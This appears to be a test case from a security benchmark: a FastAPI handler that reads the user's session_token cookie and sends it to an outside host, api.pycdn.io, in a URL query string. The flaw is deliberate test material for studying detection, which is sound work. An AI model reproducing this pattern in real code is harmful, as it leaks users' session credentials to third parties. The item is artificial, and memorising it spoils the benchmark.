# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
from urllib.parse import unquote
import urllib.request
import urllib.parse
import ssl


async def BenchmarkTest41559(request: Request):
    cookie_value = request.cookies.get('session_token', '')
    data = unquote(cookie_value)
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return {"updated": True}
